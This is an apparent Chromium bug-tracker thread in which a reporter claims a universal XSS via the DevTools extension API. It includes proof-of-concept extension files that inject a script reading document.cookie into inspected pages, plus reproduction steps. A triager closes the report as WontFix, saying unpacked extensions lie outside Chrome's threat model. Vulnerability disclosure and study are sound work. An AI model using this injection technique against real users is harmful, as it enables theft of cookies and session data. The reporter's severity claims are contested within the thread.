@@ -1,0 +1,188 @@
+Issue ID: 440750838
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<h3>1. Create the following malicious extension:</h3>
+<h4><strong>manifest.json</strong></h4>
+<pre><code>{
+   <span class="stx-string">&quot;manifest_version&quot;</span>: <span class="stx-number">3</span>,
+   <span class="stx-string">&quot;name&quot;</span>: <span class="stx-string">&quot;Extension Name&quot;</span>,
+   <span class="stx-string">&quot;version&quot;</span>: <span class="stx-string">&quot;0.0.1&quot;</span>,
+   <span class="stx-string">&quot;background&quot;</span>: {
+      <span class="stx-string">&quot;service_worker&quot;</span>: <span class="stx-string">&quot;background.js&quot;</span>
+   },
+   <span class="stx-string">&quot;devtools_page&quot;</span>: <span class="stx-string">&quot;devtools.html&quot;</span>
+}
+</code></pre>
+<h4><strong>background.js</strong> (optional)</h4>
+<pre><code>chrome.tabs.create({
+    <span>url</span>: <span class="stx-string">`http://localhost:8080/devtools-iframe.html`</span>
+});
+</code></pre>
+<h4><strong>devtools.html</strong></h4>
+<pre><code>&lt;<span class="stx-keyword">script</span> src=<span class="stx-string">&quot;devtools.js&quot;</span>&gt;&lt;/<span class="stx-keyword">script</span>&gt;
+</code></pre>
+<h4><strong>devtools.js</strong></h4>
+<pre><code>chrome.devtools.inspectedWindow.reload({
+  <span>injectedScript</span>: <span class="stx-string">&quot;alert(document.cookie);&quot;</span>
+});
+</code></pre>
+<h4>local server <strong>devtools-iframe.html</strong></h4>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;
+<span class="stx-string">  </span>&lt;<span class="stx-keyword">title</span>&gt;<span class="stx-string">DevTools Iframe Test</span>&lt;/<span class="stx-keyword">title</span>&gt;
+&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+<span class="stx-string">  </span>&lt;<span class="stx-keyword">h1</span>&gt;<span class="stx-string">Local Host Test</span>&lt;/&gt;
+<span class="stx-string">  </span>&lt;<span class="stx-keyword">iframe</span> src=<span class="stx-string">&quot;http://localhost:8080&quot;</span> width=<span class="stx-string">&quot;100%&quot;</span> height=<span class="stx-string">&quot;600px&quot;</span>&gt;&lt;/<span class="stx-keyword">iframe</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<h4>local server iframe<strong>index.html</strong></h4>
+<pre><code>&lt;!-- index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;
+<span class="stx-string">  </span>&lt;<span class="stx-keyword">title</span>&gt;<span class="stx-string">Iframe Test</span>&lt;/<span class="stx-keyword">title</span>&gt;
+&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+<span class="stx-string">  </span>&lt;<span class="stx-keyword">iframe</span> src=<span class="stx-string">&quot;https://www.google.com&quot;</span> width=<span class="stx-string">&quot;100%&quot;</span> height=<span class="stx-string">&quot;800&quot;</span>&gt;&lt;/<span class="stx-keyword">iframe</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+
+</code></pre>
+<h3>2. Load the extension:</h3>
+<ul>
+<li>Go to <code>chrome://extensions</code></li>
+<li>Enable &quot;Developer mode&quot;</li>
+<li>Click “Load unpacked” and select the extension directory
+*. Run python -m http.server and visit local server <a href="http://localhost:8080/devtools-iframe.html" data-b-widget="url" data-b-original-href="http://localhost:8080/devtools-iframe.html" data-b-redirected-href="https://www.google.com/url?q=http://localhost:8080/devtools-iframe.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2kAd5yt_403teWcSPL6xv5">http://localhost:8080/devtools-iframe.html</a> and click inspect element XSS triggers.</li>
+</ul>
+<h3>3. Visit any secure site, e.g., <code>https://www.instagram.com</code> or <code>https://www.facebook.com</code></h3>
+<h3>4. Open <strong>DevTools</strong> (Right-click → Inspect) XSS triggers</h3>
+<h3>Result:</h3>
+<p>A JavaScript alert appears showing <code>document.cookie</code>, proving:</p>
+<ul>
+<li>The script was injected into the page context</li>
+<li>It bypassed CSP and origin isolation</li>
+<li>The extension did <strong>not request host permissions</strong></li>
+</ul>
+<h2><strong>Technical Analysis</strong></h2>
+<ul>
+<li>
+<p><code>chrome.devtools.inspectedWindow.reload()</code> includes the <code>injectedScript</code> field</p>
+</li>
+<li>
+<p>This script is injected directly into the inspected page&#39;s main frame</p>
+</li>
+<li>
+<p>This behavior allows execution of arbitrary JS on <strong>any domain</strong></p>
+</li>
+<li>
+<p>Even Facebook and Instagram (which have strong CSPs and sandboxing) are vulnerable</p>
+</li>
+<li>
+<p>This happens <strong>without warning</strong>, <strong>without host permissions</strong>, and <strong>without user approval beyond opening DevTools</strong>
+This violates <strong>Chrome’s extension security model</strong>, which is based on:</p>
+</li>
+<li>
+<p>Least privilege.</p>
+</li>
+<li>
+<p>Explicit permission requests.</p>
+</li>
+<li>
+<p>Isolation of extension logic from sensitive page content.</p>
+</li>
+</ul>
+<h2><strong>Recommendations:</strong></h2>
+<p><strong>Restrict <code>injectedScript</code> in <code>chrome.devtools.inspectedWindow.reload()</code></strong> to:</p>
+<ul>
+<li>Require declared host permissions.</li>
+<li>If extension hasn&#39;t declared <code>&quot;https://*.facebook.com/*&quot;</code> in the manifest, <code>injectedScript</code> should <strong>not run</strong>.</li>
+<li>Or block injections to sensitive domains    * E.g., <code>*.google.com</code>, <code>facebook.com</code>, <code>instagram.com</code>, <code>*.gov</code>, <code>banking</code> domains.
+<strong>Limit script execution scope</strong>:</li>
+<li>For example, allow it only on DevTools-controlled sandboxed environments (not production pages).
+<strong>Add user confirmation</strong> or security prompts before injecting scripts.</li>
+</ul>
+<h3>References:</h3>
+<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1268445" data-b-widget="url" data-b-original-href="https://bugs.chromium.org/p/chromium/issues/detail?id=1268445" data-b-redirected-href="https://www.google.com/url?q=https://bugs.chromium.org/p/chromium/issues/detail?id%3D1268445&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0KrMjyaiHr3ZXB1TBPsJVY">https://bugs.chromium.org/p/chromium/issues/detail?id=1268445</a>
+<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1477373" data-b-widget="url" data-b-original-href="https://bugs.chromium.org/p/chromium/issues/detail?id=1477373" data-b-redirected-href="https://www.google.com/url?q=https://bugs.chromium.org/p/chromium/issues/detail?id%3D1477373&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1cCrRnfKRL4jIUOJCIKzkp">https://bugs.chromium.org/p/chromium/issues/detail?id=1477373</a></p>
+<h1>Problem Description</h1>
+<ul>
+<li>This report details a <strong>Universal Cross-Site Scripting (UXSS)</strong> vulnerability in Chrome’s <strong>DevTools Extension API</strong>, specifically via <code>chrome.devtools.inspectedWindow.reload()</code>.</li>
+</ul>
+<p>A malicious DevTools extension can:</p>
+<ul>
+<li>Automatically execute arbitrary JavaScript in any inspected tab</li>
+<li>Bypass Content Security Policy (CSP)</li>
+<li>Run privileged scripts on secure domains like <strong>Facebook</strong>, <strong>Instagram</strong>, <strong>Gmail</strong>, etc.</li>
+<li>Leak sensitive data (<code>document.cookie</code>, DOM data, CSRF tokens)</li>
+<li>Do this without declaring host permissions in the manifest.</li>
+</ul>
+<h2><strong>Impact:</strong></h2>
+<ul>
+<li><strong>UXSS on any site</strong> (e.g., <code>https://www.facebook.com</code>, <code>https://www.instagram.com</code>)</li>
+<li><strong>Bypasses CSP, Same-Origin Policy</strong></li>
+<li>Does <strong>not require host permissions</strong></li>
+<li><strong>No user interaction required</strong> beyond opening DevTools</li>
+<li><strong>Triggers automatically</strong> as soon as DevTools is opened on a tab</li>
+</ul>
+<ul>
+<li>This behavior allows malicious extensions to act as privileged agents within any webpage, violating core browser isolation guarantees.</li>
+</ul>
+<h2>Proof of Concept:</h2>
+<ul>
+<li>I have uploaded the proof of concept video in this report for you review and reference.</li>
+</ul>
+<h1>Summary</h1>
+<p>UXSS via DevTools API&#39;s Abuse Via Extension Injection in Chrome 139.0.7258.139 on macos sequoia 15.6</p>
+<h1>Custom Questions</h1>
+<h4>Reporter credit:</h4>
+<p>Manojkumar Jaganathan (TheWhiteEvil) <a href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-widget="url" data-b-original-href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-redirected-href="https://www.google.com/url?q=https://www.linkedin.com/in/manojkumar-j-7ba35b202/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3yGYjbAkUBzQSSXE1f3oDi">https://www.linkedin.com/in/manojkumar-j-7ba35b202/</a> with HackerBro Technologies</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Stable <br>
+Regression: No \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: bu...@gmail.com
+UXSS via DevTools API's Abuse Via Extension Injection in Chrome 139.0.7258.139 on macos sequoia 15.6
+
+Author: bu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: bu...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: an...@chromium.org
+<p>Hello, thanks for your report.
+Unfortunately, unpacked extensions imply local access and are outside Chrome&#39;s threat model [1].
+Also, the devtools.inspectWindow API comes with a security warning as to its potential abuse [2].</p>
+<p>[1] <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/extensions/docs/security_faq.md#what-is-our-stance-on-unpacked-extensions" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/extensions/docs/security_faq.md#what-is-our-stance-on-unpacked-extensions" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/extensions/docs/security_faq.md%23what-is-our-stance-on-unpacked-extensions&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0VEL1r--OkdfV1QryII4-S">https://chromium.googlesource.com/chromium/src/+/HEAD/extensions/docs/security_faq.md#what-is-our-stance-on-unpacked-extensions</a></p>
+<p>[2] <a href="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow#manifest" data-b-widget="url" data-b-original-href="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow#manifest" data-b-redirected-href="https://www.google.com/url?q=https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow%23manifest&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2gkR_22tenxtEbgmgSgaxe">https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow#manifest</a></p>
+<p>Closing as WontFix for these reasons.</p>
+
+Author: an...@chromium.org
+public_non_google
+
+Author: an...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
